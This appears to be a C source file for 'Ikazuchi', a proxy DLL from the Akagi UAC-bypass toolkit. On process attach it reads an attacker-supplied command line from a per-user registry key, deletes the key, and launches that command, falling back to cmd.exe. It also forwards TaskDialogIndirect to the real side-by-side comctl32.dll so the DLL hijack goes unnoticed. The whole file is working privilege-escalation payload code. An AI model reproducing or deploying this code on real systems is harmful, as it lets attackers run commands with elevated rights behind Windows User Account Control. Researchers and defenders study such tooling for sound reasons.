/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2017
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     2.70
*
*  DATE:        21 Mar 2017
*
*  Proxy dll entry point, Ikazuchi.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

//disable nonmeaningful warnings.
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4055) // %s : from data pointer %s to function pointer %s
#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
#pragma warning(disable: 6102) // Using %s from failed function call at line %u

#include <windows.h>
#include "shared\ntos.h"
#include <ntstatus.h>
#include "shared\minirtl.h"
#include "shared\_filename.h"

#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

#define T_SXS_DIRECTORY         L"\\\\?\\globalroot\\systemroot\\winsxs\\"
#define SXS_DIRECTORY_LENGTH    sizeof(T_SXS_DIRECTORY) - sizeof(WCHAR)

#define T_REGISTRY_USER         L"\\REGISTRY\\USER\\"
#define REGISTRY_USER_LENGTH    sizeof(T_REGISTRY_USER) - sizeof(WCHAR)

#define T_AKAGI_KEY             L"Software\\Akagi"
#define AKAGI_KEY_LENGTH        sizeof(T_AKAGI_KEY) - sizeof(WCHAR)

#define T_COMCTL32_SLASH        L"\\comctl32.dll"
#define COMCTL32_SLASH_LENGTH   sizeof(T_COMCTL32_SLASH) - sizeof(WCHAR)

#define T_AKAGI_PARAM           L"LoveLetter"
#define COMCTL32_SXS            L"microsoft.windows.common-controls"
#define COMCTL32_DLL            L"comctl32.dll"

typedef NTSTATUS(NTAPI *PENUMOBJECTSCALLBACK)(POBJECT_DIRECTORY_INFORMATION Entry, PVOID CallbackParam);

typedef struct _OBJSCANPARAM {
    PWSTR Buffer;
    SIZE_T BufferSize;
} OBJSCANPARAM, *POBJSCANPARAM;

typedef struct _SXS_SEARCH_CONTEXT {
    LPWSTR DllName;
    LPWSTR PartialPath;
    LPWSTR FullDllPath;
} SXS_SEARCH_CONTEXT, *PSXS_SEARCH_CONTEXT;

typedef HRESULT(WINAPI *pfnTaskDialogIndirect)(
    VOID *pTaskConfig,
    int  *pnButton,
    int  *pnRadioButton,
    BOOL *pfVerificationFlagChecked
    );

/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
    VOID
)
{
}

/*
* supEnumSystemObjects
*
* Purpose:
*
* Lookup object by name in given directory.
*
*/
NTSTATUS NTAPI supEnumSystemObjects(
    _In_opt_ LPWSTR pwszRootDirectory,
    _In_opt_ HANDLE hRootDirectory,
    _In_ PENUMOBJECTSCALLBACK CallbackProc,
    _In_opt_ PVOID CallbackParam
)
{
    BOOL                cond = TRUE;
    ULONG               ctx, rlen;
    HANDLE              hDirectory = NULL;
    NTSTATUS            status;
    NTSTATUS            CallbackStatus;
    OBJECT_ATTRIBUTES   attr;
    UNICODE_STRING      sname;

    POBJECT_DIRECTORY_INFORMATION	objinf;

    if (CallbackProc == NULL) {
        return STATUS_INVALID_PARAMETER_4;
    }

    status = STATUS_UNSUCCESSFUL;

    // We can use root directory.
    if (pwszRootDirectory != NULL) {
        RtlSecureZeroMemory(&sname, sizeof(sname));
        RtlInitUnicodeString(&sname, pwszRootDirectory);
        InitializeObjectAttributes(&attr, &sname, OBJ_CASE_INSENSITIVE, NULL, NULL);
        status = NtOpenDirectoryObject(&hDirectory, DIRECTORY_QUERY, &attr);
        if (!NT_SUCCESS(status)) {
            return status;
        }
    }
    else {
        if (hRootDirectory == NULL) {
            return STATUS_INVALID_PARAMETER_2;
        }
        hDirectory = hRootDirectory;
    }

    // Enumerate objects in directory.
    ctx = 0;
    do {

        rlen = 0;
        status = NtQueryDirectoryObject(hDirectory, NULL, 0, TRUE, FALSE, &ctx, &rlen);
        if (status != STATUS_BUFFER_TOO_SMALL)
            break;

        objinf = RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, rlen);
        if (objinf == NULL)
            break;

        status = NtQueryDirectoryObject(hDirectory, objinf, rlen, TRUE, FALSE, &ctx, &rlen);
        if (!NT_SUCCESS(status)) {
            RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, objinf);
            break;
        }

        CallbackStatus = CallbackProc(objinf, CallbackParam);

        RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, objinf);

        if (NT_SUCCESS(CallbackStatus)) {
            status = STATUS_SUCCESS;
            break;
        }

    } while (cond);

    if (hDirectory != NULL) {
        NtClose(hDirectory);
    }
    return status;
}

/*
* supDetectObjectCallback
*
* Purpose:
*
* Comparer callback routine used in objects enumeration.
*
*/
NTSTATUS NTAPI supDetectObjectCallback(
    _In_ POBJECT_DIRECTORY_INFORMATION Entry,
    _In_ PVOID CallbackParam
)
{
    SIZE_T BufferSize;
    POBJSCANPARAM Param = (POBJSCANPARAM)CallbackParam;

    if (Entry == NULL) {
        return STATUS_INVALID_PARAMETER_1;
    }

    if (CallbackParam == NULL) {
        return STATUS_INVALID_PARAMETER_2;
    }

    if (Entry->Name.Buffer) {
        BufferSize = Entry->Name.Length + sizeof(UNICODE_NULL);
        Param->Buffer = RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, BufferSize);
        if (Param->Buffer) {
            Param->BufferSize = BufferSize;
            _strncpy(
                Param->Buffer, Param->BufferSize / sizeof(WCHAR),
                Entry->Name.Buffer, Entry->Name.Length / sizeof(WCHAR)
            );
            return STATUS_SUCCESS;
        }
    }
    return STATUS_UNSUCCESSFUL;
}

/*
* sxsFilePathNoSlash
*
* Purpose:
*
* same as _filepath except it doesnt return last slash.
*
*/
wchar_t *sxsFilePathNoSlash(
    const wchar_t *fname,
    wchar_t *fpath
)
{
    wchar_t *p = (wchar_t *)fname, *p0 = (wchar_t*)fname, *p1 = (wchar_t*)fpath;

    if ((fname == 0) || (fpath == NULL))
        return 0;

    while (*fname != (wchar_t)0) {
        if (*fname == '\\')
            p = (wchar_t *)fname;
        fname++;
    }

    while (p0 < p) {
        *p1 = *p0;
        p1++;
        p0++;
    }
    *p1 = 0;

    return fpath;
}

/*
* sxsFindDllCallback
*
* Purpose:
*
* LdrEnumerateLoadedModules callback used to lookup sxs dlls from loader list.
*
*/
VOID NTAPI sxsFindDllCallback(
    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_ PVOID Context,
    _In_ OUT BOOLEAN *StopEnumeration
)
{
    BOOL bCond = FALSE;
    BOOLEAN bFound = FALSE;
    PSXS_SEARCH_CONTEXT sctx = (PSXS_SEARCH_CONTEXT)Context;

    do {

        if ((DataTableEntry->BaseDllName.Buffer == NULL) ||
            (DataTableEntry->FullDllName.Buffer == NULL))
            break;

        if (_strcmpi(DataTableEntry->BaseDllName.Buffer, sctx->DllName) != 0)
            break;

        if (_strstri(DataTableEntry->FullDllName.Buffer, sctx->PartialPath) == NULL)
            break;

        if (sxsFilePathNoSlash(DataTableEntry->FullDllName.Buffer, sctx->FullDllPath) == NULL)
            break;

        bFound = TRUE;

    } while (bCond);

    *StopEnumeration = bFound;
}

/*
* TaskDialogIndirectForward
*
* Purpose:
*
* Forward to comctl32!TaskDialogIndirect. We can drop it btw, its not needed.
*
*/
HRESULT WINAPI TaskDialogIndirectForward(
    VOID *pTaskConfig,
    int  *pnButton,
    int  *pnRadioButton,
    BOOL *pfVerificationFlagChecked
)
{
    BOOL     bCond = FALSE;
    WCHAR   *lpszFullDllPath = NULL, *lpszDirectoryName = NULL;
    LPWSTR   lpSxsPath = NULL;
    SIZE_T   sz;

    PVOID           hLib = NULL;
    UNICODE_STRING  DllName;
    ANSI_STRING     RoutineName;
    NTSTATUS        status;

    pfnTaskDialogIndirect   realFunc;
    SXS_SEARCH_CONTEXT      sctx;

    HRESULT hr = E_NOTIMPL;

    OutputDebugString(TEXT("Our ship has been hit!"));

    do {

        sz = UNICODE_STRING_MAX_BYTES;
        NtAllocateVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (lpszFullDllPath == NULL)
            break;

        sctx.DllName = COMCTL32_DLL;
        sctx.PartialPath = COMCTL32_SXS;
        sctx.FullDllPath = lpszFullDllPath;

        if (!NT_SUCCESS(LdrEnumerateLoadedModules(0, &sxsFindDllCallback, (PVOID)&sctx)))
            break;

        lpszDirectoryName = _filename(lpszFullDllPath);
        if (lpszDirectoryName == NULL)
            break;

        sz = SXS_DIRECTORY_LENGTH + COMCTL32_SLASH_LENGTH + ((1 + _strlen(lpszDirectoryName)) * sizeof(WCHAR));
        NtAllocateVirtualMemory(NtCurrentProcess(), &lpSxsPath, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (lpSxsPath == NULL)
            break;

        _strcpy(lpSxsPath, T_SXS_DIRECTORY);
        _strcat(lpSxsPath, lpszDirectoryName);
        _strcat(lpSxsPath, T_COMCTL32_SLASH);

        DllName.Buffer = NULL;
        DllName.Length = 0;
        DllName.MaximumLength = 0;
        RtlInitUnicodeString(&DllName, lpSxsPath);
        if (NT_SUCCESS(LdrLoadDll(NULL, NULL, &DllName, &hLib))) {
            if (hLib) {
                realFunc = NULL;
                RtlInitString(&RoutineName, "TaskDialogIndirect");
                status = LdrGetProcedureAddress(hLib, &RoutineName, 0, (PVOID *)&realFunc);
                if ((NT_SUCCESS(status)) && (realFunc != NULL)) {
                    hr = realFunc(pTaskConfig, pnButton, pnRadioButton, pfVerificationFlagChecked);
                }
            }
        }

    } while (bCond);

    if (lpszFullDllPath) {
        sz = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, &sz, MEM_RELEASE);
    }

    if (lpSxsPath) {
        sz = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &lpSxsPath, &sz, MEM_RELEASE);
    }

    return hr;
}

/*
* ucmQueryCustomParameter
*
* Purpose:
*
* Query custom parameter and run it.
*
*/
BOOL ucmQueryCustomParameter(
    VOID
)
{
    BOOL                            cond = FALSE, bResult = FALSE;

    OBJECT_ATTRIBUTES               obja;
    UNICODE_STRING                  usKey;
    NTSTATUS                        status;
    KEY_VALUE_PARTIAL_INFORMATION	keyinfo;

    SIZE_T                          memIO;
    HKEY                            hKey = NULL;
    PVOID                           ProcessHeap = NtCurrentPeb()->ProcessHeap;
    LPWSTR                          lpData = NULL, lpParameter = NULL, lpszParamKey = NULL;
    STARTUPINFOW                    startupInfo;
    PROCESS_INFORMATION             processInfo;
    ULONG                           bytesIO = 0L;
    OBJSCANPARAM                    Param;

    do {

        Param.Buffer = NULL;
        Param.BufferSize = 0;

        status = supEnumSystemObjects(L"\\Rpc Control\\Akagi", NULL,
            supDetectObjectCallback, &Param);
        if (!NT_SUCCESS(status))
            break;

        if ((Param.Buffer == NULL) || (Param.BufferSize == 0))
            break;

        memIO = MAX_PATH + Param.BufferSize + REGISTRY_USER_LENGTH + AKAGI_KEY_LENGTH;
        lpszParamKey = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, memIO);
        if (lpszParamKey == NULL)
            break;

        _strcpy_w(lpszParamKey, T_REGISTRY_USER);
        _strcat_w(lpszParamKey, Param.Buffer);
        _strcat_w(lpszParamKey, L"\\");
        _strcat_w(lpszParamKey, T_AKAGI_KEY);

        RtlSecureZeroMemory(&usKey, sizeof(usKey));
        RtlInitUnicodeString(&usKey, lpszParamKey);
        InitializeObjectAttributes(&obja, &usKey, OBJ_CASE_INSENSITIVE, NULL, NULL);
        status = NtOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
        if (!NT_SUCCESS(status)) {
            break;
        }

        RtlInitUnicodeString(&usKey, T_AKAGI_PARAM);
        status = NtQueryValueKey(hKey, &usKey, KeyValuePartialInformation, &keyinfo,
            sizeof(KEY_VALUE_PARTIAL_INFORMATION), &bytesIO);

        if ((status != STATUS_SUCCESS) &&
            (status != STATUS_BUFFER_TOO_SMALL) &&
            (status != STATUS_BUFFER_OVERFLOW))
        {
            break;
        }

        lpData = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, bytesIO);
        if (lpData == NULL) {
            break;
        }

        status = NtQueryValueKey(hKey, &usKey, KeyValuePartialInformation, lpData, bytesIO, &bytesIO);
        NtDeleteKey(hKey);
        NtClose(hKey);
        hKey = NULL;

        lpParameter = (LPWSTR)((PKEY_VALUE_PARTIAL_INFORMATION)lpData)->Data;
        if (lpParameter != NULL) { //-V547

            RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
            RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
            startupInfo.cb = sizeof(startupInfo);
            GetStartupInfo(&startupInfo);

            bResult = CreateProcessW(NULL, lpParameter, NULL, NULL, FALSE, 0, NULL,
                NULL, &startupInfo, &processInfo);

            if (bResult) {
                NtClose(processInfo.hProcess);
                NtClose(processInfo.hThread);
            }
        }

        RtlFreeHeap(ProcessHeap, 0, lpData);

    } while (cond);

    if (hKey != NULL) {
        NtDeleteKey(hKey);
        NtClose(hKey);
    }
    if (Param.Buffer != NULL) {
        RtlFreeHeap(ProcessHeap, 0, Param.Buffer);
    }
    if (lpszParamKey != NULL) {
        RtlFreeHeap(ProcessHeap, 0, lpszParamKey);
    }

    return bResult;
}

/*
* DllMain
*
* Purpose:
*
* Proxy dll entry point, start cmd.exe and exit immediatelly.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    DWORD                   cch;
    TCHAR                   cmdbuf[MAX_PATH * 2], sysdir[MAX_PATH + 1];
    STARTUPINFO             startupInfo;
    PROCESS_INFORMATION     processInfo;

    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    if (fdwReason == DLL_PROCESS_ATTACH) {

        OutputDebugString(TEXT("I'm Ikazuchi! Not 'Kaminari'! Please take care of that part too, okay!"));

        if (!ucmQueryCustomParameter()) {

            RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
            RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
            startupInfo.cb = sizeof(startupInfo);
            GetStartupInfoW(&startupInfo);

            RtlSecureZeroMemory(sysdir, sizeof(sysdir));
            cch = ExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\"), sysdir, MAX_PATH);
            if ((cch != 0) && (cch < MAX_PATH)) {
                RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
                _strcpy(cmdbuf, sysdir);
                _strcat(cmdbuf, TEXT("cmd.exe"));

                if (CreateProcessW(cmdbuf, NULL, NULL, NULL, FALSE, 0, NULL,
                    sysdir, &startupInfo, &processInfo))
                {
                    CloseHandle(processInfo.hProcess);
                    CloseHandle(processInfo.hThread);
                }
            }

        }

        OutputDebugString(TEXT("I think we blew up something!"));
    }
    return TRUE;
}
